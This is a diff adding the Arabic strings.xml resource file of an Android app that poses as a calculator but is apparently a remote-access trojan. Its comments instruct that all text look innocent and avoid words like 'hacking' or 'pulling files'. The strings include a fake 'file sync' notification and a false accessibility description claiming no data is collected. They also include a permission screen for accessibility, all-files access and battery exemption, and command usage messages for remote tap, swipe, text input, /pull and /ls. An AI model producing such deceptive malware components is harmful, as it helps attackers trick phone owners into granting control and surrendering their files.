@@ -1,0 +1,85 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+  strings.xml — نصوص التطبيق.
+
+  المسار: app/src/main/res/values/strings.xml
+
+  ملاحظات:
+  - كل النصوص هنا يجب أن تبدو بريئة (تمويه).
+  - لا تضع كلمات مثل "اختراق" أو "تحكم" أو "سحب ملفات".
+  - النصوص المستخدمة في الإشعارات وإعدادات إمكانية الوصول
+    يجب أن تكون مقنعة للفريق الأزرق.
+-->
+<resources>
+
+    <!-- اسم التطبيق (يظهر تحت الأيقونة وفي الإعدادات) -->
+    <string name="app_name">آلة حاسبة</string>
+
+    <!-- ============ الإشعار (Notifier) ============ -->
+    <string name="notif_channel_name">مزامنة الملفات</string>
+    <string name="notif_channel_desc">مزامنة الملفات في الخلفية</string>
+    <string name="notif_title">مزامنة الملفات</string>
+    <string name="notif_text">جارٍ مزامنة ملفاتك في الخلفية</string>
+
+    <!-- ============ خدمة إمكانية الوصول ============ -->
+    <!--
+      description: يظهر في شاشة تفعيل الخدمة (نص طويل).
+      يجب أن يكون مقنعاً: يشرح "فائدة" الخدمة للمستخدم.
+    -->
+    <string name="accessibility_description">
+        تساعد هذه الخدمة على تحسين تجربة استخدام التطبيق من خلال قراءة محتوى الشاشة
+        وتسهيل التنقل بين العناصر. تُستخدم فقط لتحسين إمكانية الوصول ولا تجمع أي بيانات.
+    </string>
+
+    <!-- summary: نص قصير يظهر في قائمة الخدمات -->
+    <string name="accessibility_summary">خدمة مساعدة لتحسين إمكانية الوصول</string>
+
+    <!-- ============ شاشة الأذونات (PermissionActivity) ============ -->
+    <string name="perm_title">إعدادات مطلوبة</string>
+    <string name="perm_subtitle">لتعمل المزامنة بشكل صحيح، يرجى تفعيل الإعدادات التالية:</string>
+
+    <string name="perm_accessibility_title">خدمة إمكانية الوصول</string>
+    <string name="perm_accessibility_desc">مطلوبة لقراءة محتوى الشاشة وتحسين التنقل.</string>
+    <string name="perm_accessibility_btn">تفعيل</string>
+    <string name="perm_accessibility_enabled">✅ مفعّلة</string>
+
+    <string name="perm_files_title">الوصول لجميع الملفات</string>
+    <string name="perm_files_desc">مطلوبة لمزامنة ملفاتك وصورك.</string>
+    <string name="perm_files_btn">تفعيل</string>
+    <string name="perm_files_enabled">✅ مفعّل</string>
+
+    <string name="perm_battery_title">إيقاف تحسين البطارية</string>
+    <string name="perm_battery_desc">مطلوب لضمان عمل المزامنة في الخلفية دون انقطاع.</string>
+    <string name="perm_battery_btn">تفعيل</string>
+    <string name="perm_battery_enabled">✅ مفعّل</string>
+
+    <string name="perm_notifications_title">الإشعارات</string>
+    <string name="perm_notifications_desc">مطلوبة لإظهار حالة المزامنة.</string>
+    <string name="perm_notifications_btn">تفعيل</string>
+    <string name="perm_notifications_enabled">✅ مفعّلة</string>
+
+    <string name="perm_done">تم</string>
+    <string name="perm_refresh">تحديث الحالة</string>
+
+    <!-- ============ شاشة الآلة الحاسبة (MainActivity) ============ -->
+    <string name="calc_error">خطأ</string>
+    <string name="calc_divide_by_zero">لا يمكن القسمة على صفر</string>
+
+    <!-- ============ رسائل عامة ============ -->
+    <string name="msg_loading">جارٍ التحميل…</string>
+    <string name="msg_error">حدث خطأ</string>
+    <string name="msg_ok">حسناً</string>
+    <string name="msg_cancel">إلغاء</string>
+
+    <!-- ============ رسائل CommandHandler (اختيارية، للتوطين) ============ -->
+    <string name="cmd_unknown">أمر غير معروف</string>
+    <string name="cmd_usage_tap">الاستخدام: /tap X Y</string>
+    <string name="cmd_usage_swipe">الاستخدام: /swipe X1 Y1 X2 Y2 [MS]</string>
+    <string name="cmd_usage_text">الاستخدام: /text النص</string>
+    <string name="cmd_usage_pull">الاستخدام: /pull PATH</string>
+    <string name="cmd_usage_ls">الاستخدام: /ls [PATH]</string>
+    <string name="cmd_accessibility_off">خدمة إمكانية الوصول غير مفعّلة</string>
+    <string name="cmd_file_not_found">الملف غير موجود</string>
+    <string name="cmd_no_permission">لا تملك الصلاحية المطلوبة</string>
+
+</resources>
